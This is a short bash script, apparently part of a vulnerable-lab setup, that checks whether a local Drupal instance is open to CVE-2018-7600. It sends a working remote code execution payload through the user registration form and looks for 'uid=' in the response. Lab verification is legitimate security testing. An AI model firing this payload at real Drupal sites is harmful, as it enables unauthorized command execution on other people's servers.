#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/deploy-common.sh"

TARGET="Drupal"
URL="http://localhost:8081"
CVE="CVE-2018-7600"

log_info "Verifying $TARGET ($CVE) at $URL..."

RESULT=$(curl -k -s --connect-timeout 5 --max-time 15 \
  "${URL}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id' 2>/dev/null)

if echo "$RESULT" | grep -q "uid="; then
    log_success "$TARGET is vulnerable ($CVE) — RCE confirmed"
    echo "  Response: $(echo "$RESULT" | grep -o 'uid=[^"]*' | head -1)"
    exit 0
else
    log_error "$TARGET exploit failed or target not reachable"
    exit 1
fi
